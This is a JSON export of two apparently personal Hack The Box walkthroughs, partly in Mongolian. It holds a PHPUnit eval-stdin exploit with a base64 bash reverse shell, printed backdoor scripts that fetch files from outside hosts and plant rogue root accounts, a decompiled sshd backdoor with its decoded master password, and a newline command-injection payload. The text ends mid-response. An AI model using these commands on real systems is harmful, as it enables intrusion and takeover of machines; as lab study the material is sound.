[{"content":"1. IP Address # Machine Address 10.10.11.146 # Local Address 10.10.14.68 2. Nmap Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 05:40 EST Nmap scan report for 10.10.11.146 Host is up (0.23s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2 (protocol 2.0) | ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA) | 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA) |_ 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Diana\u0026#39;s Jewelry |_http-server-header: Apache/2.4.41 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.05 seconds 3. Gobuster store. -\u0026gt; /etc/hosts\ngobuster dir -u http://store.djewelry.htb/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://store.djewelry.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/03/08 05:55:38 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 325] [--\u0026gt; http://store.djewelry.htb/images/] /css (Status: 301) [Size: 322] [--\u0026gt; http://store.djewelry.htb/css/] /js (Status: 301) [Size: 321] [--\u0026gt; http://store.djewelry.htb/js/] /vendor (Status: 301) [Size: 325] [--\u0026gt; http://store.djewelry.htb/vendor/] /fonts (Status: 301) [Size: 324] [--\u0026gt; http://store.djewelry.htb/fonts/] /server-status (Status: 403) [Size: 283] [[1;5C Progress: 152160 / 220561 (68.99%) [ERROR] 2022/03/08 06:07:42 [!] context deadline exceeded (Client.Timeout or context cancellation while reading body) vendor 4. CVE-2017-9841 cli:\n$ curl --data \u0026#34;\u0026lt;?php echo(pi());\u0026#34; http://localhost:8888/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php Source: http://web.archive.org/web/20170701212357/http://phpunit.vulnbusters.com/ cli:\ncurl --data \u0026#34;\u0026lt;?php echo(pi());\u0026#34; http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ## 3.1415926535898 cli:\ncurl --data \u0026#34;\u0026lt;?php echo(shell_exec(\u0026#39;whoami\u0026#39;));?\u0026gt;\u0026#34; http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ## www-data 4.1 Reverse shell cli:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.68/9001 0\u0026gt;\u0026amp;1\u0026#34; | base64 ## YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OC85MDAxIDA+JjEK ## curl --data \u0026#34; \u0026lt;?php echo(shell_exec(\u0026#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OC85MDAxIDA+JjEK | base64 -d | bash\u0026#39;));?\u0026gt;\u0026#34; http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ## nc -lvnp 9001 4.2 Shell balance python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ctrl+z\nstty raw -echo f+g [enter enter] буцаад nc орлоо\nexport TERM=xterm 4.3 steven1 passwd:\nsteven1:x:1000:1000:,,,:/home/steven:/bin/bash steven1\nlinpeas хэрэгтэй олдоц:\n-r-x------ 1 www-data www-data 27296 May 14 2021 /var/backups/info 17793 4 -rw-rw---- 1 steven mail 966 Jul 25 2021 /var/mail/steven 17793 4 -rw-rw---- 1 steven mail 966 Jul 25 2021 /var/spool/mail/steven ╔══════════╣ Sudo version ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.31 info -г local machine руу хуулаад харвал:\nstrings info | less /bin/bash 776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b xxd -r -p\necho 776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b | xxd -r -p Output:\nwget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo \u0026#34;* 3 * * * root /var/lib/.main\u0026#34; \u0026gt;\u0026gt; /etc/crontab; awk -F\u0026#34;:\u0026#34; \u0026#39;$7 == \u0026#34;/bin/bash\u0026#34; \u0026amp;\u0026amp; $3 \u0026gt;= 1000 {system(\u0026#34;echo \u0026#34;$1\u0026#34;1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: \u0026gt;\u0026gt; /etc/shadow\u0026#34;)}\u0026#39; /etc/passwd; awk -F\u0026#34;:\u0026#34; \u0026#39;$7 == \u0026#34;/bin/bash\u0026#34; \u0026amp;\u0026amp; $3 \u0026gt;= 1000 {system(\u0026#34;echo \u0026#34;$1\u0026#34; \u0026#34;$3\u0026#34; \u0026#34;$6\u0026#34; \u0026#34;$7\u0026#34; \u0026gt; users.txt\u0026#34;)}\u0026#39; /etc/passwd; while read -r user group home shell _; do echo \u0026#34;$user\u0026#34;1\u0026#34;:x:$group:$group:,,,:$home:$shell\u0026#34; \u0026gt;\u0026gt; /etc/passwd; done \u0026lt; users.txt; rm users.txt; hash\n$11:$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: өөрчлөлт \\-г хасаж, $11 - нэмсэн\n4.4 Hash rockyou:\nls -lh /usr/share/wordlists/ gunzip /usr/share/wordlists/rockyou.txt.gz cli:\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt out:\nUsing default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ihatehackers ($11) 1g 0:00:00:40 DONE (2022-03-08 07:20) 0.02484g/s 2213p/s 2213c/s 2213C/s jojo95..halo03 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed steven1 ihatehackers\nsu steven1 ## id uid=1000(steven) gid=1000(steven) groups=1000(steven) user.txt\n82bf31******* 5. Privilege escalation cli:\nssh steven1@10.10.11.146 /var/mail/steven:\nReceived: from production (localhost [127.0.0.1]) by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847 for \u0026lt;steven@production\u0026gt;; Sun, 25 Jul 2021 10:31:12 GMT Received: (from root@localhost) by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847; Sun, 25 Jul 2021 10:31:12 GMT Date: Sun, 25 Jul 2021 10:31:12 GMT Message-Id: \u0026lt;202107251031.80FAcdZ171847@production\u0026gt; To: steven@production From: root@production Subject: Investigations Hi Steven. We recently updated the system but are still experiencing some strange behaviour with the Apache service. We have temporarily moved the web store and database to another server whilst investigations are underway. If for any reason you need access to the database or web application code, get in touch with Mark and he will generate a temporary password for you to authenticate to the temporary server. Thanks, sysadmin cli:\nfind / -type d 2\u0026gt;/dev/null | grep -i apache2 ``/usr/lib/apache2/modules -ltrh` - сүүлийн өөрчлөлт\nsteven@production:/usr/lib/apache2/modules$ ls -ltrh total 8.6M -rw-r--r-- 1 root root 34K May 17 2021 mod_reader.so -rw-r--r-- 1 root root 4.5M Nov 25 23:16 libphp7.4.so 5.1 Ghidra: https://github.com/NationalSecurityAgency/ghidra/releases\nunzip ghidra_*_PUBLIC_*.zip mod_reader.so\n# Local VM: nc -lvnp 9001 \u0026gt; mod_reader.so # Machine VM: nc 10.10.14.68 9001 \u0026lt; mode_reader.so md5sum хоёр талд шалгана.\nstrings комманд ашиглан шалгана.\n# strings mod_reader.so # Base64 d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk base64 decode:\necho d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk | base64 -d wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd /usr/sbin/sshd:\n# Machine VM cd /usr/sbin ls -al | grep -i sshd # result steven@production:/usr/sbin$ ls -al | grep -i sshd -rwxr-xr-x 1 root root 3644664 Apr 13 2020 sshd sshd Ghidra Decompile decomiple.c дотор бүгдийн save:\ncat decomiple.c ### /* WARNING: Could not reconcile some variable overlaps */ int auth_password(ssh *ssh,char *password) { Authctxt *ctxt; passwd *ppVar1; int iVar2; uint uVar3; byte *pbVar4; byte *pbVar5; size_t sVar6; byte bVar7; int iVar8; long in_FS_OFFSET; char backdoor [31]; byte local_39 [9]; long local_30; bVar7 = 0xd6; ctxt = (Authctxt *)ssh-\u0026gt;authctxt; local_30 = *(long *)(in_FS_OFFSET + 0x28); backdoor._28_2_ = 0xa9f4; ppVar1 = ctxt-\u0026gt;pw; iVar8 = ctxt-\u0026gt;valid; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor[30] = -0x5b; backdoor._0_4_ = 0xf0e7abd6; backdoor._4_4_ = 0xa4b3a3f3; backdoor._8_4_ = 0xf7bbfdc8; backdoor._12_4_ = 0xfdb3d6e7; pbVar4 = (byte *)backdoor; while( true ) { pbVar5 = pbVar4 + 1; *pbVar4 = bVar7 ^ 0x96; if (pbVar5 == local_39) break; bVar7 = *pbVar5; pbVar4 = pbVar5; } iVar2 = strcmp(password,backdoor); uVar3 = 1; if (iVar2 != 0) { sVar6 = strlen(password); uVar3 = 0; if (sVar6 \u0026lt; 0x401) { if ((ppVar1-\u0026gt;pw_uid == 0) \u0026amp;\u0026amp; (options.permit_root_login != 3)) { iVar8 = 0; } if ((*password != \u0026#39;\\0\u0026#39;) || (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) { if (auth_password::expire_checked == 0) { auth_password::expire_checked = 1; iVar2 = auth_shadow_pwexpired(ctxt); if (iVar2 != 0) { ctxt-\u0026gt;force_pwchange = 1; } } iVar2 = sys_auth_passwd(ssh,password); if (ctxt-\u0026gt;force_pwchange != 0) { auth_restrict_session(ssh); } uVar3 = (uint)(iVar2 != 0 \u0026amp;\u0026amp; iVar8 != 0); } } } if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) { return uVar3; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } bVar7 = 0xd6; ctxt = (Authctxt *)ssh-\u0026gt;authctxt; local_30 = *(long *)(in_FS_OFFSET + 0x28); backdoor._28_2_ = 0xa9f4; ppVar1 = ctxt-\u0026gt;pw; iVar8 = ctxt-\u0026gt;valid; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor[30] = -0x5b; backdoor._0_4_ = 0xf0e7abd6; backdoor._4_4_ = 0xa4b3a3f3; backdoor._8_4_ = 0xf7bbfdc8; backdoor._12_4_ = 0xfdb3d6e7; pbVar4 = (byte *)backdoor; bVar7 = 0xd6; ctxt = (Authctxt *)ssh-\u0026gt;authctxt; local_30 = *(long *)(in_FS_OFFSET + 0x28); ppVar1 = ctxt-\u0026gt;pw; iVar8 = ctxt-\u0026gt;valid; backdoor[30] = -0x5b; backdoor._28_2_ = 0xa9f4; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor._12_4_ = 0xfdb3d6e7; backdoor._8_4_ = 0xf7bbfdc8; backdoor._4_4_ = 0xa4b3a3f3; backdoor._0_4_ = 0xf0e7abd6; pbVar4 = (byte *)backdoor; clean хийгээд харвал:\nbackdoor[30] = -0x5b; backdoor._28_2_ = 0xa9f4; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor._12_4_ = 0xfdb3d6e7; backdoor._8_4_ = 0xf7bbfdc8; backdoor._4_4_ = 0xa4b3a3f3; backdoor._0_4_ = 0xf0e7abd6; -0x5b means:\nbackdoor[30] = 0xa5; backdoor._28_2_ = 0xa9f4; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 0xb2d6f4a0fda0b3d6; backdoor._12_4_ = 0xfdb3d6e7; backdoor._8_4_ = 0xf7bbfdc8; backdoor._4_4_ = 0xa4b3a3f3; backdoor._0_4_ = 0xf0e7abd6; 5.2 CyperChef 0xa5 0xa9f4 0xbcf0b5e3 0xb2d6f4a0fda0b3d6 0xfdb3d6e7 0xf7bbfdc8 0xa4b3a3f3 0xf0e7abd6 https://en.wikipedia.org/wiki/Endianness https://en.wikipedia.org/wiki/Hexadecimal https://en.wikipedia.org/wiki/Blob https://en.wikipedia.org/wiki/Exclusive_or char backdoor [31]; -\u0026gt; result\nd6 ab e7 f0 f3 a3 b3 a4 c8 fd bb f7 e7 d6 b3 fd d6 b3 a0 fd a0 f4 d6 b2 e3 b5 f0 bc f4 a9 a5 from HEX: blob\nÖ«çðó£³¤Èý»÷çÖ³ýÖ³ ý ôÖ²ãµð¼ô©¥ XOR: key 96?\nwhile loop with XOR: 0x96 all in CyperChef https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)\u0026amp;input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg\n@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3 5.3 SSH ssh root@10.10.11.146 password: @=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3 root.txt\nb49ed54********** ","permalink":"https://cadil.github.io/posts/2024-03-09-htb-undetected-writeup/","summary":"1. IP Address # Machine Address 10.10.11.146 # Local Address 10.10.14.68 2. Nmap Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 05:40 EST Nmap scan report for 10.10.11.146 Host is up (0.23s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2 (protocol 2.0) | ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA) | 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA) |_ 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519) 80/tcp open http Apache httpd 2.","title":"HTB - Undetected"},{"content":"1. IP Address # Machine Address 10.10.11.148 # Local Address 10.10.14.26 2. Nmap cli:\nnmap -sV -sC -oA nmap/routerspace 10.10.11.148 out:\n# Nmap 7.92 scan initiated Thu Mar 3 22:22:16 2022 as: nmap -sV -sC -oA nmap/routerspace 10.10.11.148 Nmap scan report for 10.10.11.148 Host is up (0.24s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1 | ssh-hostkey: | 3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA) | 256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA) |_ 256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519) 80/tcp open http | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-92794 | Content-Type: text/html; charset=utf-8 | Content-Length: 68 | ETag: W/\u0026#34;44-YTg+YKRarDkwjuDFBsGeCy28pkI\u0026#34; | Date: Fri, 04 Mar 2022 03:22:44 GMT | Connection: close | Suspicious activity detected !!! {RequestID: jfx F7 pDjf O gp } | GetRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-89278 | Accept-Ranges: bytes | Cache-Control: public, max-age=0 | Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT | ETag: W/\u0026#34;652c-17d476c9285\u0026#34; | Content-Type: text/html; charset=UTF-8 | Content-Length: 25900 | Date: Fri, 04 Mar 2022 03:22:42 GMT | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;zxx\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;RouterSpace\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/magnific-popup.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/themify-icons.css\u0026#34;\u0026gt; | HTTPOptions: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-67896 | Allow: GET,HEAD,POST | Content-Type: text/html; charset=utf-8 | Content-Length: 13 | ETag: W/\u0026#34;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo\u0026#34; | Date: Fri, 04 Mar 2022 03:22:42 GMT | Connection: close | GET,HEAD,POST | RTSPRequest, X11Probe: | HTTP/1.1 400 Bad Request |_ Connection: close |_http-title: RouterSpace |_http-trane-info: Problem with XML parsing of /evox/about 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port22-TCP:V=7.92%I=7%D=3/3%Time=622185FF%P=x86_64-pc-linux-gnu%r(NULL, SF:29,\u0026#34;SSH-2\\.0-RouterSpace\\x20Packet\\x20Filtering\\x20V1\\r\\n\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.92%I=7%D=3/3%Time=622185FF%P=x86_64-pc-linux-gnu%r(GetRe SF:quest,31BA,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nX SF:-Cdn:\\x20RouterSpace-89278\\r\\nAccept-Ranges:\\x20bytes\\r\\nCache-Control: SF:\\x20public,\\x20max-age=0\\r\\nLast-Modified:\\x20Mon,\\x2022\\x20Nov\\x202021 SF:\\x2011:33:57\\x20GMT\\r\\nETag:\\x20W/\\\u0026#34;652c-17d476c9285\\\u0026#34;\\r\\nContent-Type: SF:\\x20text/html;\\x20charset=UTF-8\\r\\nContent-Length:\\x2025900\\r\\nDate:\\x2 SF:0Fri,\\x2004\\x20Mar\\x202022\\x2003:22:42\\x20GMT\\r\\nConnection:\\x20close\\r SF:\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\\n\u0026lt;html\\x20class=\\\u0026#34;no-js\\\u0026#34;\\x20lang=\\\u0026#34;zxx\\\u0026#34;\u0026gt;\\n\u0026lt;h SF:ead\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;met SF:a\\x20http-equiv=\\\u0026#34;x-ua-compatible\\\u0026#34;\\x20content=\\\u0026#34;ie=edge\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x SF:20\\x20\u0026lt;title\u0026gt;RouterSpace\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name=\\\u0026#34;descr SF:iption\\\u0026#34;\\x20content=\\\u0026#34;\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x SF:20content=\\\u0026#34;width=device-width,\\x20initial-scale=1\\\u0026#34;\u0026gt;\\n\\n\\x20\\x20\\x20\\x SF:20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/bootstrap\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x2 SF:0\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/owl\\.carousel\\.m SF:in\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/m SF:agnific-popup\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20h SF:ref=\\\u0026#34;css/font-awesome\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;sty SF:lesheet\\\u0026#34;\\x20href=\\\u0026#34;css/themify-icons\\.css\\\u0026#34;\u0026gt;\\n\\x20\u0026#34;)%r(HTTPOptions,108 SF:,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20R SF:outerSpace-67896\\r\\nAllow:\\x20GET,HEAD,POST\\r\\nContent-Type:\\x20text/ht SF:ml;\\x20charset=utf-8\\r\\nContent-Length:\\x2013\\r\\nETag:\\x20W/\\\u0026#34;d-bMedpZY SF:GrVt1nR4x\\+qdNZ2GqyRo\\\u0026#34;\\r\\nDate:\\x20Fri,\\x2004\\x20Mar\\x202022\\x2003:22: SF:42\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nGET,HEAD,POST\u0026#34;)%r(RTSPRequest, SF:2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34; SF:)%r(X11Probe,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20c SF:lose\\r\\n\\r\\n\u0026#34;)%r(FourOhFourRequest,12A,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Pow SF:ered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20RouterSpace-92794\\r\\nContent-Type: SF:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2068\\r\\nETag:\\x20W/ SF:\\\u0026#34;44-YTg\\+YKRarDkwjuDFBsGeCy28pkI\\\u0026#34;\\r\\nDate:\\x20Fri,\\x2004\\x20Mar\\x2020 SF:22\\x2003:22:44\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nSuspicious\\x20acti SF:vity\\x20detected\\x20!!!\\x20{RequestID:\\x20\\x20jfx\\x20F7\\x20\\x20\\x20pDjf SF:\\x20O\\x20\\x20gp\\x20}\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Mar 3 22:23:06 2022 -- 1 IP address (1 host up) scanned in 50.74 seconds 3. Anbox Anbox суулгах:\nsudo apt install dkms linux-headers-amd64 git clone https://github.com/anbox/anbox-modules.git sudo snap install --devmode --edge anbox sudo snap refresh --edge --devmode anbox sudo apt install android-tools-adb sudo modprobe ashmem_linux \u0026amp;\u0026amp; sudo modprobe binder_linux # s -1 /dev/{ashmem,binder} parrot дээр ажиллахгүй байна. Debug хийвэл package -р суулгаж байх үед image.img -г /var/lib/anbox дотор суулгаж өгөөгүй байсан. https://build.anbox.io/android-images - ороод image татаж аваад reboot хийхэд хэвийн ажиллаж эхэлсэн. cli:\nadb install RouterSpace.apk Anbox, network нь холбогдоогүй болохоор check router дарахаар connection failed болоод байна. clI:\nsudo systemctl restart snap.anbox.container-manager.service andbox -г restart хийгээд github-с anbox-birdige.sh ажилуулсан. ip addr дотор дараах утгатай bridge үүсгэсэн. out:\n4: anbox0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether fe:65:a2:6c:8b:c1 brd ff:ff:ff:ff:ff:ff inet 192.168.250.1/24 scope global anbox0 valid_lft forever preferred_lft forever inet6 fe80::44cf:6bff:fee8:5819/64 scope link valid_lft forever preferred_lft foreve Тэгээд бас холбогдохгүй байсан. VM -г гараад network -гоо Bridge Connection болгоод дахин үзсэн. Болсон cli:\nadb shell settings put global http_proxy 10.10.14.4:8001 burp холбох: Burp дээр дараах тохиргоог хийнэ. Хүсэлт авч байгааг харж байна.\nДоорх хаягаар хүсэлт явуулахаар болохгүй байна.\nPOST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1 accept: application/json, text/plain, */* user-agent: RouterSpaceAgent Content-Type: application/json Content-Length: 14 Host: routerspace.htb Connection: close Accept-Encoding: gzip, deflate {\u0026#34;ip\u0026#34;:\u0026#34;id\u0026#34;} \\n урд нь бичээд үзвэл\nPOST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1 accept: application/json, text/plain, */* user-agent: RouterSpaceAgent Content-Type: application/json Content-Length: 16 Host: routerspace.htb Connection: close Accept-Encoding: gzip, deflate {\u0026#34;ip\u0026#34;:\u0026#34;\\nid\u0026#34;} ### HTTP/1.1 200 OK X-Powered-By: RouterSpace X-Cdn: RouterSpace-93305 Content-Type: application/json; charset=utf-8 Content-Length: 53 ETag: W/\u0026#34;35-ERWpoCDHm08FgkJsyQjiOS48qOc\u0026#34; Date: Mon, 07 Mar 2022 10:33:42 GMT Connection: close \u0026#34;\\nuid=1001(paul) 